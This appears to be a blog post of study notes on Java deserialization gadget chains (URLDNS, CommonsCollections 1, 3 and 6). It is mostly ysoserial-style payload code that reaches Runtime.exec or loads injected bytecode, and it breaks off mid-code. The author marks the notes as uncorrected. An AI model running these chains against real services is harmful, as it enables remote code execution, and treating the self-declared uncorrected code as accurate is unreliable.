---
title: "Java学习笔记Ⅲ"
slug: "java-study-notes-03"
description: "记录向，CC&CB&Shiro | *有大量修正未同步，请勿参考本文学习"
date: 2022-03-23T18:40:31+08:00
categories: ["NOTES&SUMMARY"]
series: ["Java学习笔记", "反序列化"]
tags: ["Java", "unserialize"]
draft: false
toc: true
---

## 序列化&反序列化

与PHP类似，java的`readObject`对标`__wakeup`，但不完全一样，`readObject`倾向于解决“反序列化时如何还原一个完整对象”这个问题，而PHP的`__wakeup`倾向于解决“反序列化后如何初始化这个对象”的问题，它可以在反序列化之后执行初始化操作，该赋的值基本由`__construct`控制，真正的入手点一般在`__destruct`中

对java来说，一个可利用的`readObject`是链子最初的起点

在序列化对象时会调用对象的`writeObject`方法，参数类型是`ObjectOutputStream`，这个类有一个`annotateClass`方法，可以通过重写这个方法来向序列化后的数据中写入内容，这个内容位于`objectAnnotation`中

相应的，反序列化时会调用`readObject`，可以读出前面写入的内容进行处理

python的反序列化危害最大，可以直接操控PVM栈上的指令

## URLDNS

```java
public class URLDNS implements ObjectPayload<Object> {

        public Object getObject(final String url) throws Exception {

                //Avoid DNS resolution during payload creation
                //Since the field <code>java.net.URL.handler</code> is transient, it will not be part of the serialized payload.
                URLStreamHandler handler = new SilentURLStreamHandler();

                HashMap ht = new HashMap(); // HashMap that will contain the URL
                URL u = new URL(null, url, handler); // URL to use as the Key
                ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

                Reflections.setFieldValue(u, "hashCode", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.

                return ht;
        }

        public static void main(final String[] args) throws Exception {
                PayloadRunner.run(URLDNS.class, args);
        }

        /**
         * <p>This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.
         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior
         * using the serialized object.</p>
         *
         * <b>Potential false negative:</b>
         * <p>If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the
         * second resolution.</p>
         */
        static class SilentURLStreamHandler extends URLStreamHandler {

                protected URLConnection openConnection(URL u) throws IOException {
                        return null;
                }

                protected synchronized InetAddress getHostAddress(URL u) {
                        return null;
                }
        }
}
```

这是yoserial中URLDNS部分的源码，很短

整个链子的攻击利用的是HashMap会调用key的hashCode方法来定位对应的value，当url object作为key时会由于hashCode的计算进而触发DNS请求（因为要解析hostname是否指向同一个Ip

### HashMap

```java
private void readObject(ObjectInputStream s)
    throws IOException, ClassNotFoundException {
    ObjectInputStream.GetField fields = s.readFields();
    // Read loadFactor (ignore threshold)
    float lf = fields.get("loadFactor", 0.75f);
    if (lf <= 0 || Float.isNaN(lf))
        throw new InvalidObjectException("Illegal load factor: " + lf);
    lf = Math.min(Math.max(0.25f, lf), 4.0f);
    HashMap.UnsafeHolder.putLoadFactor(this, lf);
    reinitialize();
    s.readInt();                // Read and ignore number of buckets
    int mappings = s.readInt(); // Read number of mappings (size)
    if (mappings < 0) {
        throw new InvalidObjectException("Illegal mappings count: " + mappings);
    } else if (mappings == 0) {
        // use defaults
    } else if (mappings > 0) {
        float fc = (float)mappings / lf + 1.0f;
        int cap = ((fc < DEFAULT_INITIAL_CAPACITY) ?
                   DEFAULT_INITIAL_CAPACITY :
                   (fc >= MAXIMUM_CAPACITY) ?
                   MAXIMUM_CAPACITY :
                   tableSizeFor((int)fc));
        float ft = (float)cap * lf;
        threshold = ((cap < MAXIMUM_CAPACITY && ft < MAXIMUM_CAPACITY) ?
                     (int)ft : Integer.MAX_VALUE);
        // Check Map.Entry[].class since it's the nearest public type to
        // what we're actually creating.
        SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);
        @SuppressWarnings({"rawtypes","unchecked"})
        Node<K,V>[] tab = (Node<K,V>[])new Node[cap];
        table = tab;
        // Read the keys and values, and put the mappings in the HashMap
        for (int i = 0; i < mappings; i++) {
            @SuppressWarnings("unchecked")
                K key = (K) s.readObject();
            @SuppressWarnings("unchecked")
                V value = (V) s.readObject();
            putVal(hash(key), key, value, false, false);
        }
    }
}
```

这是它重写的`readObject`方法，在最后一行对key计算hash值，会触发hashCode方法，而计算hashCode时会触发DNS的请求

构造链子时我们需要初始化一个`java.net.URL`对象作为HashMap的key，之后将这个对象的hashCode设为-1，强制在反序列化时重新计算hashCode，触发后续调用

另外在ysoserial的payload生成时为了防止执行DNS请求，使用了`SilentURLStreamHandler`

## CC1(<8u71

在p牛的java安全漫谈中给出了CC1的极简版demo

```java
public class testCC1 {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.getRuntime()),
            new InvokerTransformer("exec", new Class[]{String.class},
                new Object[]{"calc.exe"}),
        };

        Transformer transformerChain = new ChainedTransformer(transformers);

        Map innerMap = new HashMap();
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        outerMap.put("test", "amiz");
    }
}
```

### 前置

首先理解一下没见过的几个函数

- `Transformer`

一个接口，只有一个待实现的transform方法

```java
public interface Transformer{
	public Object transform(Object input);
}
```

- `TransformedMap`

TransformedMap对innerMap作了修饰，传出的outerMap是修饰后的M

```java
Map outerMap = TransformedMap.decorate(innerMap, KeyTransformer, valueTransformer);
```

keyTransformer是处理新元素key的回调，valueTransformer是处理新元素value的回调；这里的回调并不是回调函数 而是一个实现了上面Transformer接口的类

- `ConstantTransformer`

```java
public ConstantTransformer(Object constantToReturn){
	super();
	iConstant = constantToReturn;
}

public Object transform(Object input){
	return iConstant;
}
```

是一个实现了Transformer接口的类，它的过程类似构造函数时传入一个对象，在transform方法中将这个对象返回，作用是包装任意一个对象，在执行回调时返回这个对象，方便后续操作

- `InvokerTransformer`

也是一个实现了Transformer接口的类，类可以用来执行任意方法，这也是反序列化能RCE的关键

```java
public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args){
	super();
	iMethodName = methodName;
	iParamTypes = paramTypes;
	iArgs = args;
}
```

第一个参数是待执行的方法名，第二个参数是方法的参数类型，第三个是传入的参数

之后的回调transform方法执行input对象的iMethodName方法

```java
public Object transform(Object input){
	if(input == null){
		return null;
	}
	try{
		Class cls = input.getClass();
		Method method = cls.getMethod(iMethodName, iParamTypes);
		return method.invoke(input, iArgs);
	}catch(NoSuchMethodException ex){
		throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' does not exist");
	}catch(IllegalAccessException ex){
		throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
	}catch(InvocationTargetException ex){
		throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' threw an exception", ex);
	}
}
```

- `ChainedTransformer`

也是一个实现了Transformer接口的类，作用是将内部多个Transformer串在一起

```java
public ChainedTransformer(Transformer[] transformers){
	super();
	iTransformers = transformers;
}
public Object transform(Object object){
	for(int i = 0; i < iTransformers.length; i++){
		object = iTransformers[i].transform(object);
	}
	return object;
}
```

前一个回调返回的结果可以作为后一个回调的参数传入

### demo

然后再来看demo

```java
public class testCC1 {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.getRuntime()),
            new InvokerTransformer("exec", new Class[]{String.class},
                new Object[]{"calc.exe"}),
        };

        Transformer transformerChain = new ChainedTransformer(transformers);

        Map innerMap = new HashMap();
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        outerMap.put("test", "amiz");
    }
}
```

我们创建了一个ChainedTransformer，包含ConstantTransformer（得到Runtime对象）和InvokerTransformer（执行代码部分），这个ChainedTransformer只是作为回调部分，我们用TransformedMap.decorate对它进行包装，最后通过`outerMap.put` 向Map中放入新元素触发回调，进而执行命令

### TransformedMap

```java
package ysoserial.payloads;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;


public class testCC1 {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",
                new Class[]{String.class, Class[].class},
                new Object[]{"getRuntime", new Class[0]}
            ),
            new InvokerTransformer("invoke",
                new Class[]{Object.class, Object[].class},
                new Object[]{null, new Object[0]}
            ),
            new InvokerTransformer("exec",
                new Class[]{String.class},
                new String[]{"calc.exe"}
            ),
        };

        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        innerMap.put("value", "xxx");
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);

        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor construct = cls.getDeclaredConstructor(Class.class, Map.class);
        construct.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(handler);
        oos.close();

        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object) ois.readObject();
    }
}
```

仅有demo的代码不足以构造完全可用的poc，实际的反序列化中，不同于手工执行outerMap.put()，我们离不开一个合适的`readObject`触发`outerMap.put`->`transform`

这里用到的是`sun.reflect.annotation.AnnotationInvocationHandler`，看一下它的`readObject`

```java
private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
    var1.defaultReadObject();
    AnnotationType var2 = null;

    try {
        var2 = AnnotationType.getInstance(this.type);
    } catch (IllegalArgumentException var9) {
        throw new InvalidObjectException("Non-annotation type in annotation serial stream");
    }

    Map var3 = var2.memberTypes();
    Iterator var4 = this.memberValues.entrySet().iterator();

    while(var4.hasNext()) {
        Entry var5 = (Entry)var4.next();
        String var6 = (String)var5.getKey();
        Class var7 = (Class)var3.get(var6);
        if (var7 != null) {
            Object var8 = var5.getValue();
            if (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) {
                var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + "[" + var8 + "]")).setMember((Method)var2.members().get(var6)));
            }
        }
    }

}
```

代码比较好看懂，先是得到前面传入的Map（我们传入经过TransformedMap修饰的对象），之后依次遍历，到了`setValue`时会触发transform的回调

所以我们构造POC时需要创建`AnnotationInvocationHandler`对象，并把前面的`HashMap`传进来作为Map参数

```java
Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor construct = cls.getDeclaredConstructor(Class.class, Map.class);
construct.setAccessible(true);
InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);
```

同时因为AnnotationInvocationHandler是内部类不能直接new，我们用反射+setAccessible(true)的方式实例化；并且由于`Runtime.getRuntime`没有实现序列化的接口，所以我们用反射获取当前上下文的Runtime对象

另外，为了满足readObject中的`var7!=null`的判断，要满足

- `sun.reflect.annotation.AnnotationInvocationHandler`构造函数的第一个参数为Annotation的子类，且必须至少含有一个方法，假设方法名为X
- 被`TransformedMap.decorate`修饰的Map中必有一个键名为X的元素

8u71之后的版本修改了`AnnotationInvocationHandler`的readObject函数，不再使用反序列化得到的Map对象，而是新建了LinkedHashMap对象，把原来的key-value添加进去，所以后续对Map的操作都是基于这个`LinkedHashMap`对象，不会再触发set或put了

最后把对象生成序列化流

```java
ByteArrayOutputStream barr = new ByteArrayOutputStream();
ObjectOutputStream oos = new ObjectOutputStream(barr);
oos.writeObject(obj);
oos.close;
```

### LazyMap

```java
package ysoserial.payloads;

import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.JavaVersion;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	Gadget chain:
		ObjectInputStream.readObject()
			AnnotationInvocationHandler.readObject()
				Map(Proxy).entrySet()
					AnnotationInvocationHandler.invoke()
						LazyMap.get()
							ChainedTransformer.transform()
								ConstantTransformer.transform()
								InvokerTransformer.transform()
									Method.invoke()
										Class.getMethod()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.getRuntime()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.exec()

	Requires:
		commons-collections
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@PayloadTest ( precondition = "isApplicableJavaVersion")
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({ Authors.FROHOFF })
public class CommonsCollections1 extends PayloadRunner implements ObjectPayload<InvocationHandler> {

	public InvocationHandler getObject(final String command) throws Exception {
		final String[] execArgs = new String[] { command };
		// inert chain for setup
		final Transformer transformerChain = new ChainedTransformer(
			new Transformer[]{ new ConstantTransformer(1) });
		// real chain for after setup
		final Transformer[] transformers = new Transformer[] {
				new ConstantTransformer(Runtime.class),
				new InvokerTransformer("getMethod", new Class[] {
					String.class, Class[].class }, new Object[] {
					"getRuntime", new Class[0] }),
				new InvokerTransformer("invoke", new Class[] {
					Object.class, Object[].class }, new Object[] {
					null, new Object[0] }),
				new InvokerTransformer("exec",
					new Class[] { String.class }, execArgs),
				new ConstantTransformer(1) };

		final Map innerMap = new HashMap();

		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

		final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);

		final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);

		Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain

		return handler;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollections1.class, args);
	}

	public static boolean isApplicableJavaVersion() {
        return JavaVersion.isAnnInvHUniversalMethodImpl();
    }
}
```

ysoserial用的是与TransformedMap类似的LazyMap，两者的区别在于TransformedMap是在执行put操作时回调transform，而LazyMap是在get方法中执行的factory.transform，在get找不到值才会调用factory.transform去获取一个值（所谓Lazy

```java
public Object get(Object key){
	if(map.containsKey(key) == false){
		Object value = factory.transform(key);
		map.put(key, value);
		return value;
	}
	return map.get(key);
}
```

LazyMap的利用比TransformedMap复杂，因为AnnotationInvocationHandler覆写的readObject中并没有直接使用Map的get，所以这里选择通过java对象代理的技术来触发它的invoke 进而到get

我们知道对象代理可以在运行期动态创建某个`interface`的实例，可以编写`InvocationHandler`来实现接口的方法调用，可以做到加工和覆写（也正是叫做Proxy的原因 对接口进行Proxy 省去中间类），类似PHP魔术方法中的`__call` 可以劫持对象内部的方法调用，用到java.reflect.Proxy

```java
Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, handler);
```

第一个参数ClassLoader我们使用默认的即可，第二个是我们需要代理的对象集合，第三个参数是一个实现了InvocationHandler接口的对象，里面包含了具体的代理逻辑

比如一个覆写了invoke方法的ExampleInvocationHandler类

```java
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.util.Map;

public class ExampleInvocationHandler implements InvocationHandler {
    protected Map map;
    public ExampleInvocationHandler(Map map){
        this.map = map;
    }

    @Override
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable{
        if(method.getName().compareTo("get") == 0){
            System.out.println("Hookmethod: " + method.getName());
            return "Hacked Object";
        }
        return method.invoke(this.map, args);
    }
}
```

作用是监控到调用的方法名是get时返回Hacked Object字符串，我们尝试外部调用它

```java
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class App {
    public static void main(String[] args) throws Exception{
        InvocationHandler handler = new ExampleInvocationHandler(new HashMap());
        Map proxyMap = (Map)Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, handler);

        proxyMap.put("hello", "world");
        String result = (String) proxyMap.get("hello");
        System.out.println(result);

    }
}
```

回显Hook methd: get Hacked Object

回看`sun.reflect.annotation.AnnotationInvocationHandler`，如果我们把这个对象用Proxy进行代理，那么readObject时只要调用任意方法 就会进入`AnnotationInvocationHandler#invoke`触发get

#### 构造

先是用LazyMap替换TransformedMap

```java
Map outerMap = LazyMap.decorate(innerMap, transformerChain);
```

然后对sun.reflect.annotation.AnnotationInvocationHandler进行Proxy

```java
Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor construct = cls.getDeclaredConstructor(Class.class, Map.class);
construct.setAccessible(true);
InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);

Map proxyMap = (Map)Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, handler);
```

代理后的对象是proxyMap，但是不能直接对其序列化 我们的入口点是`sun.reflect.annotation.AnnotationInvocationHandler#readObject`，还要再用AnnotationInvocationHandler对这个proxyMap包裹

```java
handler = (InvocationHandler)construct.newInstance(Retention.class, proxyMap);
```

注意到ysoserial的末尾有new ConstantTransformer(1)，可以隐藏启动进程的日志特征

————注意：LazyMap的CC1同样无法解决8u71后的使用问题，尽管它的漏洞触发在get和invoke，和setValue无关

## CC6

上面提到CC1由于`sun.reflect.annotation.AnnotationInvocationHandler#readObject`在8u71后的逻辑变化导致失效，这里来看一条解决高版本Java利用的CC6（代码部分来自p牛

```java
/*
 -> Gadget chain:
 java.io.ObjectInputStream.readObject()
 java.util.HashMap.readObject()
 java.util.HashMap.hash()

org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()

org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
 org.apache.commons.collections.map.LazyMap.get()

org.apache.commons.collections.functors.ChainedTransformer.transform()

org.apache.commons.collections.functors.InvokerTransformer.transform()
 java.lang.reflect.Method.invoke()
 java.lang.Runtime.exec()
*/
```

CC6解决CC1的方案是在上下文中寻找其它可以调用`LazyMap.get`的地方，用到的是`org.apache.commons.collections.keyvalue.TiedMapEntry`

```java
package org.apache.commons.collections.keyvalue;
import java.io.Serializable;
import java.util.Map;
import java.util.Map.Entry;

import org.apache.commons.collections.KeyValue;
public class TiedMapEntry implements Entry, KeyValue, Serializable {
    private static final long serialVersionUID = -8453869361373831205L;
    private final Map map;
    private final Object key;
    public TiedMapEntry(Map map, Object key) {
        this.map = map;
        this.key = key;
    }
    public Object getKey() {
        return this.key;
    }
    public Object getValue() {
        return this.map.get(this.key);
    }

    // ...
    public int hashCode() {
        Object value = this.getValue();
        return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^
            (value == null ? 0 : value.hashCode());
    }

// ..

}
```

在它的`getValue`中调用了`this.map.get`，而hashCode方法调用了getValue（HashMap的实现原理），在ysoserial中是利用`java.util.HashSet#readObject`到`HashMap#put()`到`HashMap#hash(key)`最后到`TiedMapEntry#hashCode()`

在p牛的简化poc中省略了前两步，通过`HashMap#readObject`直接到`HashMap#hash(key)`，hash中调用了`key.hashCode`（纯HashMap的实现原理

构造poc，我们只需要让这个key等于TiedMapEntry对象，再改动亿点点

首先是恶意LazyMap

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;


public class testCC6 {
    public static void main(String[] args) throws Exception{
        Transformer[] fakeTransformers = new Transformer[]{new ConstantTransformer(1)}; // 避免生成payload时触发RCE
        Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",
                new Class[]{String.class, Class[].class},
                new Object[]{"getRuntime", new Class[0]}
            ),
            new InvokerTransformer("invoke",
                new Class[]{Object.class, Object.class},
                new Object[]{null, new Object[0]}
            ),
            new InvokerTransformer("exec",
                new Class[]{String.class},
                new String[]{"calc.exe"}
            ),
            new ConstantTransformer(1),
        };
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);	// 得到被装饰后的恶意LazyMap对象

        TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");

        Map expMap = new HashMap();	// 为了调用TiedMapEntry#hashCode 新建HashMap 并把tme作为key
        expMap.put(tme, "valuevalue");
        outerMap.remove("keykey");  // put也会调用hash(key) 避免对后面get的影响

        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");	// 替换真正的transformers
        f.setAccessible(true);
        f.set(transformerChain, transformers);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();	// 序列化部分
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(expMap);
        oos.close();

        System.out.println(barr);	// 触发
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object) ois.readObject();
    }
}
```

逻辑是比较清晰的，每一部分也都比较好懂







## CC3(<8u71

由于`TemplatesImpl`可以直接控制字节码（即java代码），所以尝试结合CC1 demo和执行字节码的部分就可以构造出CC3（的一部分）了，需要注意的是要将`InvokerTransformer`执行的方法从显式的rce（getRuntime.exec）变为调用`TemplatesImpl::newTransformer`

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class testCC3mini {
    public static void main(String[] args) throws Exception{
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=");
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{code});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(obj),
            new InvokerTransformer("newTransformer",
                null,
                null
            )
        };
        Transformer transformerChain = new ChainedTransformer(transformers);

        Map innerMap = new HashMap();
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        outerMap.put("test", "amiz");
    }

    public static void setFieldValue(Object obj, String fieldName, Object value)throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

但是并不是标准的payload，ysoserial中并没有用到InvokerTransformer，原因是`SerialKiller`的存在限制了它，我们换为`com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter`

这个类的构造方法中调用了了`(TransformerImpl) templates.newTransformer()`，免去了我们的手工调用

缺少InvokerTransformer无法调用TraAXFilter的构造方法，这里用`org.apache.commons.collections.functors.InstantiateTransformer`这个Transformer

所以我们利用`InstantiateTransformer`调用到`TrAXFilter`的构造方法，再利用它构造方法中的`templates.newTransformer`调用到`TemplatesImpl`里的字节码

```java
Transformer[] transformers = new Transformer[]{
	new ConstantTransformer(TrAXFilter.class),
	new InstantiateTransformer(
	new Class[]{Templates.class},
	new Object[]{obj})
};
```

完整CC3

```java
package ysoserial.payloads;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.TransformedMap;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;


public class testCC3 {
    public static void main(String[] args) throws Exception {
        TemplatesImpl obj = new TemplatesImpl();
        // setFieldValue(obj, "_bytecodes", new byte[][]{Base64.getDecoder().decode("yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=")});
        setFieldValue(obj, "_bytecodes", new byte[][]{
            ClassPool.getDefault().get(evil.EvilTemplatesImpl.class.getName()).toBytecode()
        });
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        Transformer[] fakeTransformers = new Transformer[] {
            new ConstantTransformer(1)
        };
        Transformer[] transformers = new Transformer[]{
